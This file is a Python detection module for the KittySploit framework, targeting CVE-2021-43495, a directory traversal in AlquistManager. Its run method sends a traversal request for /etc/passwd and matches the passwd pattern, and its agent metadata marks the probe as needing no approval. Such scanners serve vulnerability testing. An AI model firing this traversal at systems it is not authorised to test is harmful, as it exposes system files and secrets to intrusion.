#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""AlquistManager branch as of commit 280d99f43b11378212652e75f6f3159cde9c1d36 is affected by a directory travers."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'AlquistManager Local File Inclusion Detection',
        'description': 'AlquistManager branch as of commit 280d99f43b11378212652e75f6f3159cde9c1d36 is affected by a directory traversal vulnerability in alquist/IO/input.py. This attack can cause the disclosure of critical secrets stored anywhere on the system and can significantly aid in getting remote code access.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve', 'cve2021', 'lfi', 'alquist', 'alquistai', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://github.com/AlquistManager/alquist/issues/43',
            'https://nvd.nist.gov/vuln/detail/CVE-2021-43495',
            'https://github.com/ARPSyndicate/cvemon',
            'https://github.com/ARPSyndicate/kenzer-templates',
        ],
        'cve': 'CVE-2021-43495',
    }

    def run(self):
        r = self.http_request(method="GET", path='/asd/../../../../../../../../etc/passwd', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_regexes = ('root:.*:0:0:',)
        if (any(re.search(rx, body, 0) for rx in body_regexes)):
            self.set_info(
                severity='high',
                reason="AlquistManager Local File Inclusion detected",
                path='/asd/../../../../../../../../etc/passwd',
            )
            return True
        return False

